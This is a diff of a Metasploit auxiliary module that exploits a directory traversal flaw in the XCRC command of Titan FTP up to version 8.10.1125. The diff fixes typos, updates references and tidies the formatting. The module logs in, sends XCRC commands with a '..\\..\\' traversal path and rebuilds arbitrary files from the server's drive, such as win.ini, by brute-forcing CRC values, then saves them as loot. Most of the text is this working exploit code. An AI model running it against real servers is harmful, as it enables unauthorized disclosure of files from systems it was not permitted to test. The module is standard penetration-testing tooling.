@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -17,9 +14,9 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Titan FTP XCRC Directory Traversal Information Disclosure',
-      'Description'    => %q{
-          This module exploits a directory traversal vulnreability in the XCRC command
+      'Name' => 'Titan FTP XCRC Directory Traversal Information Disclosure',
+      'Description' => %q{
+          This module exploits a directory traversal vulnerability in the XCRC command
         implemented in versions of Titan FTP up to and including 8.10.1125. By making
         sending multiple XCRC command, it is possible to disclose the contents of any
         file on the drive with a simple CRC "brute force" attack.
@@ -27,37 +24,35 @@ class MetasploitModule < Msf::Auxiliary
         Although the daemon runs with SYSTEM privileges, access is limited to files
         that reside on the same drive as the FTP server's root directory.
       },
-      'Author'         =>
-        [
-          'jduck',
-          'Brandon McCann @zeknox <bmccann[at]accuvant.com>',
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'OSVDB', '65533'],
-          [ 'URL', 'http://seclists.org/bugtraq/2010/Jun/160' ]
-        ],
-      'DisclosureDate' => 'Jun 15 2010'
+      'Author' => [
+        'jduck',
+        'Brandon McCann @zeknox <bmccann[at]accuvant.com>',
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        [ 'CVE', '2010-2426' ],
+        [ 'OSVDB', '65533'],
+        [ 'URL', 'https://seclists.org/bugtraq/2010/Jun/160' ]
+      ],
+      'DisclosureDate' => '2010-06-15'
     )
 
     register_options(
       [
         Opt::RPORT(21),
         OptString.new('TRAVERSAL', [ true, "String to traverse to the drive's root directory", "..\\..\\" ]),
-        OptString.new('PATH', [ true, "Path to the file to disclose, releative to the root dir.", 'windows\\win.ini'])
-      ], self.class)
+        OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'windows\\win.ini'])
+      ]
+    )
   end
 
-
   def run_host(ip)
-
     c = connect_login
     return if not c
 
     path = datastore['TRAVERSAL'] + datastore['PATH']
 
-    res = send_cmd( ['XCRC', path, "0", "9999999999"], true )
+    res = send_cmd(['XCRC', path, "0", "9999999999"], true)
     if not (res =~ /501 Syntax error in parameters or arguments\. EndPos of 9999999999 is larger than file size (.*)\./)
       print_error("Unable to obtain file size! File probably doesn't exist.")
       return
@@ -70,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     old_crc = 0
     file_data = ''
     file_size.times { |off|
-      res = send_cmd( ['XCRC', path, "0", (off+1).to_s], true )
+      res = send_cmd(['XCRC', path, "0", (off + 1).to_s], true)
       if not (res =~ /250 (.*)\r?\n/)
         raise RuntimeError, "Unable to obtain XCRC of byte #{off}!"
       end
@@ -98,12 +93,11 @@ class MetasploitModule < Msf::Auxiliary
     progress(file_size, file_size)
 
     fname = datastore['PATH'].gsub(/[\/\\]/, '_')
-    p = store_loot("titanftp.traversal", "text/plain", "rhost", file_data, fname)
-    print_status("Saved in: #{p}")
+    p = store_loot("titanftp.traversal", "text/plain", ip, file_data, fname)
+    print_good("Saved in: #{p}")
     vprint_status(file_data.inspect)
 
     disconnect
-
   end
 
   #
@@ -124,5 +118,4 @@ class MetasploitModule < Msf::Auxiliary
     percent = "%3.2f%%" % done.to_f
     print_status("Obtaining file contents - %7s done (%d/%d bytes)" % [percent, current, total])
   end
-
 end
